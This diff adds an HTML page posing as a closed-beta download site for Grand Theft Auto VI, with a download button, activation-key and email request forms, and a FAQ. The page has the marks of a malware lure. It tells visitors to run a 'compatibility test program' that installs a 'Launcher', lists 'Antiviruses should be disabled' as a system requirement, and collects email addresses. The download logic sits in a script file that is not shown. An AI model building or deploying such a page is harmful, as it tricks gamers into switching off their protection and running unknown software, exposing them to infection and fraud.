@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grand Theft Auto VI Download</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="#download">Download</a></li>
+            <li><a href="#activation">Activation</a></li>
+            <li><a href="#request-key">Request Key</a></li>
+            <li><a href="#faq">FAQ</a></li>
+            <li><a href="#system-requirements">System Requirements</a></li>
+        </ul>
+    </nav>
+
+    <header>
+        <img src="icon.png" alt="GTA VI Icon">
+        <h1>Grand Theft Auto VI</h1>
+        <p class="countdown" id="countdown"></p>
+    </header>
+
+    <main>
+        <section id="download">
+            <div class="download-content">
+                <button id="downloadBtn"><i class="fas fa-download"></i> Download Now</button>
+                <div id="progressBar">
+                    <div id="progress"></div>
+                </div>
+                <div id="progressText">0%</div>
+            </div>
+        </section>
+
+        <section id="activation" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <h2>Game Activation</h2>
+                <input type="text" id="activationKey" placeholder="Enter Rockstar Beta Access Key">
+                <button id="activateBtn">Activate Game</button>
+            </div>
+        </section>
+
+        <section id="request-key" class="modal">
+            <div class="modal-content">
+                <span class="close">&times;</span>
+                <h2>Request Key</h2>
+                <input type="email" id="email" placeholder="Enter your email">
+                <button id="requestKeyBtn">Request Key</button>
+            </div>
+        </section>
+
+        <section id="faq">
+            <h2 class="faq-header">FAQ</h2>
+            <div class="faq-content">
+                <div class="faq-content">
+                    <h3 class="question">Has Grand Theft Auto VI been released?</h3>
+                    <p class="answer">No, no, no. This is only a closed beta preview version.</p>
+                    <h3 class="question">Will I be able to download the game directly?</h3>
+                    <p class="answer">Not exactly like that. First you need to download the computer compatibility test program. If you pass this test, Launcher will be installed on your computer.</p>
+                    <h3 class="question">Is this the official Rockstar Games website?</h3>
+                    <p class="answer">No, no, no. This site is not affiliated with Rockstar Games and its partners. It is a preview fan-made site only.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="system-requirements">
+            <h2>System Requirements</h2>
+            <ul>
+                <li><i class="fas fa-windows"></i> OS: Windows 11</li>
+                <li><i class="fas fa-microchip"></i> Processor: Intel Core i7-8700K / AMD Ryzen 7 2700X</li>
+                <li><i class="fas fa-memory"></i> Memory: 32 GB RAM</li>
+                <li><i class="fas fa-video"></i> Graphics: NVIDIA GeForce RTX 3080 / AMD Radeon RX 6800 XT</li>
+                <li><i class="fas fa-hdd"></i> Storage: 260 GB available SSD space</li>
+                <li><i class="fas fa-robot"></i> AI: AI Supported CPU Decoder</li>
+                <li><i class="fas fa-key"></i> Virtualization: Virtualization supported OS</li>
+                <li><i class="fas fa-virus"></i> AntiVirus: Antiviruses should be disabled.</li>
+                 
+            </ul>
+        </section>
+
+        <section id="screenshots">
+            <h2>Screenshots</h2>
+            <div class="carousel">
+                <img src="screeenshot1.jpg" alt="Screenshot 1">
+                <img src="screenshot2.jpg" alt="Screenshot 2">
+                <img src="screenshot3.jpg" alt="Screenshot 3">
+            </div>
+        </section>
+
+        <section id="contact">
+            <h2>Contact Us</h2>
+            <form id="contactForm">
+                <input type="text" id="name" placeholder="Your Name" required>
+                <input type="email" id="contactEmail" placeholder="Your Email" required>
+                <textarea id="message" placeholder="Your Message" required></textarea>
+                <button type="submit" id="sendBtn">Open Ticket</button>
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 GTA VI Download</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
